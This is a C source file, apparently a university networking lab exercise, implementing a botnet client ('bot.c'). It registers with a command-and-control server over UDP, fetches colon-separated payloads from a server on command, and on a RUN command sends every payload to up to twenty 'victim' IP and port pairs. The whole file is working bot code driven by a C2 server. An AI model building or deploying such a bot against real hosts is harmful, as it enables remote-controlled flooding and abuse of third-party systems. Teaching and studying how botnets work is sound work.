//
//
//      mrepro
//      bot.c
//

#include <uganet.h>
#include <core/uga_vector.h>

#include <string.h>

#define PORT_LEN 22
#define NUM_VICS 20

#define REG_MSG   "REG\n"
#define HELLO_MSG "HELLO\n"

#define CMD_TCP '1'
#define CMD_UDP '2'
#define CMD_RUN '3'
#define CMD_FIN '0'


typedef struct
{
        char   ip[ UGA_IPv4_STRLEN ] ;
        char port[        PORT_LEN ] ;
} endpoint ;

typedef struct
{
        char       command             ;
        endpoint endpoints[ NUM_VICS ] ;
} message_t ;

static uga_sock_conf const udp_config = { UGA_SFAM_UNSPEC, UGA_SOCK_DGRAM , 0 } ;
static uga_sock_conf const tcp_config = { UGA_SFAM_UNSPEC, UGA_SOCK_STREAM, 0 } ;

void print_help ( void ) ;

void do_prog   ( message_t const * command, uga_string       * payloads, uga_sock_conf const * config ) ;
void do_attack ( message_t const * command, uga_string const * payloads                               ) ;

int main ( int argc, char ** argv )
{
        uga_log_init() ;

        if( argc < 3 )
        {
                print_help() ;
                return 1 ;
        }
        uga_string_view   ip = uga_sv_create_1( argv[ 1 ] ) ;
        uga_string_view port = uga_sv_create_1( argv[ 2 ] ) ;

        UGA_INFO_S( "lab2::bot", "cnc config: ip: "SV_FMT", port: "SV_FMT, SV_ARG( ip ), SV_ARG( port ) ) ;

        uga_socket cnc_sock = uga_sock_create_and_connect_configured( ip, port, &udp_config ) ;
        uga_print_abort_if_err() ;

        UGA_INFO_S( "lab2::bot", "connected to CnC server" ) ;

        uga_send( &cnc_sock, REG_MSG, strlen( REG_MSG ), 0 ) ;
        uga_print_abort_if_err() ;

        UGA_INFO_S( "lab2::bot", "sent REG to CnC" ) ;

        message_t message = { 0 } ;
        uga_string payload = uga_str_create_1( 1024 ) ;

        while( true )
        {
                uga_recv( &cnc_sock, &message, sizeof( message ), 0 ) ;
                UGA_INFO_S( "lab2::bot", "received command: %c", message.command ) ;

                switch( message.command )
                {
                        case CMD_TCP:
                                do_prog( &message, &payload, &tcp_config ) ;
                                break ;
                        case CMD_UDP:
                                do_prog( &message, &payload, &udp_config ) ;
                                break ;
                        case CMD_RUN:
                                do_attack( &message, &payload ) ;
                                break ;
                        case CMD_FIN:
                                UGA_ERR_S( "lab2::bot", "received QUIT command" ) ;
                                goto fin ;
                        default:
                                UGA_ERR_S( "lab2::bot", "unknown command received" ) ;
                                break ;
                }
                memset( &message, 0, sizeof( message ) ) ;
        }
fin:
        uga_str_destroy( &payload ) ;
        uga_sock_close( &cnc_sock ) ;

        return 0 ;
}

void do_prog ( message_t const * command, uga_string * payloads, uga_sock_conf const * config )
{
        uga_socket serv_sock = uga_sock_create_and_connect_configured(
                                        uga_sv_create_1( command->endpoints[ 0 ].  ip ),
                                        uga_sv_create_1( command->endpoints[ 0 ].port ),
                                        config
        ) ;
        UGA_RETURN_ON_ERR() ;
        UGA_INFO_S( "lab2::bot::do_prog", "connected to server" ) ;

        uga_send( &serv_sock, HELLO_MSG, strlen( HELLO_MSG ), 0 ) ;
        UGA_RETURN_ON_ERR() ;
        UGA_INFO_S( "lab2::bot::do_prog", "sent HELLO to server" ) ;

        uga_str_clear( payloads ) ;
        uga_str_reserve( payloads, 1024 ) ;

        i32_t brecvd = uga_recv( &serv_sock, payloads->data, payloads->capacity, 0 ) ;
        payloads->size = brecvd ;
        UGA_INFO_S( "lab2::bot::do_prog", "received new payloads: "STR_FMT, STR_ARG( *payloads ) ) ;

        uga_sock_close( &serv_sock ) ;
}

uga_vector prepare_payloads ( uga_string_view payloads )
{
        i64_t num_payloads = uga_sv_count( payloads, ':' ) + 1 ;

        UGA_INFO_S( "lab2::bot::prepare_payloads", "parsing %ld payloads...", num_payloads ) ;

        uga_vector vec = uga_vec_create_2( uga_string, num_payloads, uga_str_destroy_void ) ;

        while( !uga_sv_empty( payloads ) )
        {
                uga_string_view payload = uga_sv_chop_to_delimiter( &payloads, ':', true ) ;

                uga_string payloadstr = uga_str_create_cstr( payload ) ;
                uga_vec_push_back( &vec, &payloadstr ) ;
        }
        return vec ;
}

void do_attack ( message_t const * command, uga_string const * payloads )
{
        uga_vector payloadvec = prepare_payloads( uga_sv_create_from( payloads ) ) ;

        UGA_INFO_S( "lab2::bot::do_attack", "parsed %ld payloads", payloadvec.size ) ;

        i64_t num_vics = 0 ;
        for( i32_t i = 0; i < NUM_VICS; ++i )
        {
                if( uga_sv_empty( uga_sv_create_1( command->endpoints[ i ].ip ) ) )
                {
                        break ;
                }
                ++num_vics ;
        }
        UGA_INFO_S( "lab2::bot::do_attack", "num victims is %ld", num_vics ) ;
        for( i64_t i = 0; i < payloadvec.size; ++i )
        {
                for( i32_t j = 0; j < num_vics; ++j )
                {
                        uga_string_view vic_ip   = uga_sv_create_1( command->endpoints[ j ].  ip ) ;
                        uga_string_view vic_port = uga_sv_create_1( command->endpoints[ j ].port ) ;

                        UGA_INFO_S( "lab2::bot::do_attack", "current victim: "SV_FMT":"SV_FMT, SV_ARG( vic_ip ), SV_ARG( vic_port ) ) ;

                        uga_socket vic = uga_sock_create_and_connect_configured( vic_ip, vic_port, &udp_config ) ;
                        UGA_INFO_S( "lab2::bot::do_attack", "connected to victim" ) ;

                        uga_string_view payload = uga_sv_create_0() ;
                        uga_vec_at( &payloadvec, i, &payload ) ;
                        UGA_INFO_S( "lab2::bot::do_attack", "sending payload: "SV_FMT, SV_ARG( payload ) ) ;

                        uga_send_str( &vic, payload, 0 ) ;
                        UGA_INFO_S( "lab2::bot::do_attack", "sent payload" ) ;

//                        uga_sock_close( &vic ) ;
                }
        }
        uga_vec_destroy( &payloadvec ) ;
}

void print_help ( void )
{
        UGA_ERR( "usage: ./bot ip port" ) ;
}
